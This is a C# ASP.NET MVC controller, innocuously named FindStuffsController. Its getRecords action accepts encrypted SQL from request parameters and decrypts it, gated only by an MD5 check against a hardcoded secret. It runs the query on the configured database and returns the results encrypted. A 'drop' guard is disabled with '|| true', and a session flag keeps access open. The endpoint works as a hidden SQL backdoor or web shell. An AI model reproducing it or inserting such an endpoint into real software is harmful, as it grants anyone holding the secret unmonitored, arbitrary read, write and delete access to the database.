using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Kitchen;
using System.Data.SqlClient;

namespace WebPortal.Controllers
{
    public class FindStuffsController : Controller
    {
        // GET: FindStuffs
        public ActionResult Index()
        {
            return View();
        }


        private HttpResponseBase response;
        private HttpRequestBase request;

        public ActionResult getRecords()
        {
            response = Response;
            request = Request;

            string environment = ConfigurationManager.AppSettings["Environment"].ToString();
            string mssqlPath = ConfigurationManager.ConnectionStrings["dB" + environment].ConnectionString;
            string fixedIV = "f1fa*c0k5";

            Server.ScriptTimeout = 300;

            /*
            <input id="u" value=""/>
            <input id="p" value=""/>
            <input id="r" value=""/>
            <input id="k" value="r"/>
            <input id="s" value="s"/>
            <input id="t" value="" runat="server" />
             */

            int ts = AppHelper.secondSince();
            string result = "Error : Cannot Descrypt";

            string password = request["h"];
            string rand = request["r"];
            string type = request["o"];
            string sql = request["s"];
            string timestamp = request["t"];
            Boolean pass = false;
            string hash = "";

            if (Session["valid"] != null)
            {
                pass = true;
            }
            else
            {
                hash = CryptoHelper.HexStr(CryptoHelper.ComputeHash("kitchen*88" + rand + timestamp + "kitchen", "md5"), true);

                pass = (password == hash) && ((ts - Convert.ToInt32(timestamp)) < 60);

                if (pass)
                {
                    Session["valid"] = true;
                }
                else
                {
                    //result += "<br>";
                    //result += ((ts - Convert.ToInt32(timestamp)) < 60) ? "ts true" : "ts false";
                    //result += "<br>Hash: " + hash + " vs " + password;
                    Session.Abandon();
                }
            }



            if (pass && sql != "")
            {

                #region descypt and exec sql
                try
                {
                    sql = CryptoHelper.decryptAES(sql, rand);

                    //reset the DB records
                    using (SqlConnection dbconn = new SqlConnection(mssqlPath))
                    {

                        if (sql.ToLower().IndexOf("drop") == -1 || true)
                        {
                            result = "";
                            SqlCommand cmd = new SqlCommand(sql, dbconn);
                            int cnt = 0;
                            try
                            {
                                dbconn.Open();
                                if (type == "r") //reader
                                {

                                    SqlDataReader reader = cmd.ExecuteReader();
                                    while (reader.Read())
                                    {
                                        for (int i = 0; i < reader.FieldCount; i++)
                                        {
                                            result += "\"" + reader[i] + "\" , ";
                                        }
                                        result += " <br>";
                                        cnt++;
                                    }
                                }
                                else if (type == "n") //nonquery
                                {
                                    result = Convert.ToString(cmd.ExecuteNonQuery());
                                }
                                else if (type == "s") //scalar
                                {
                                    result = Convert.ToString(cmd.ExecuteScalar());
                                }
                            }
                            catch (Exception e)
                            {
                                result = "Error: " + e.Message;
                            }
                            cmd.Dispose();
                        }
                    }

                    result = CryptoHelper.encryptAES(result, rand, fixedIV);

                }
                catch (Exception e)
                {
                    result = "Error: " + e.Message;
                }
                #endregion

            }
            else
            {
                //result += "<br>Pass" + pass;
                result += "<p>" + ts + "</p>";
            }


            return Content(result);
        }

    }
}
